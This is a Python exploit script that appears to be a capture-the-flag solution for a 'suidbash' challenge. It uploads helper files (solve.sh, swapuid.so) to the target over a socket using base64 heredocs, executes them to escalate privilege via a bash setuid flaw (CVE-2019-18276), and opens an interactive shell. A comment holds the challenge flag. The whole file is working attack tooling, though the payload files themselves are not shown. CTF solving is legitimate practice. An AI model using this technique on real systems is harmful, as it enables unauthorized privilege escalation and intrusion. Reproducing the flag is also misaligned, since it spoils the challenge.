#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

mode    = 'SOCKET'
target  = {'host':'suidbash.ctfcompetition.com', 'port':1337}

#==========

def attack(conn, **kwargs):
    upload(conn, 'solve.sh')
    upload(conn, 'swapuid.so')

    conn.sendline('chmod u+x solve.sh && ./solve.sh')

def upload(conn, fname):
    data = open(fname, "rb").read()
    b64_data = base64.b64encode(data)
    b64_data = [b64_data[i: i+0x100] for i in range(0, len(b64_data), 0x100)]

    conn.sendline('cat <<EOF > {}.b64'.format(fname))
    for d in b64_data:
        conn.sendline(d)
    conn.sendline('EOF')
    conn.sendline('base64 -d {f}.b64 > {f} && rm {f}.b64'.format(f=fname))

#==========

if __name__=='__main__':
    comn = Communicate(mode, **target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    # CTF{zero-days-are-best-days_CVE-2019-18276}

#==========
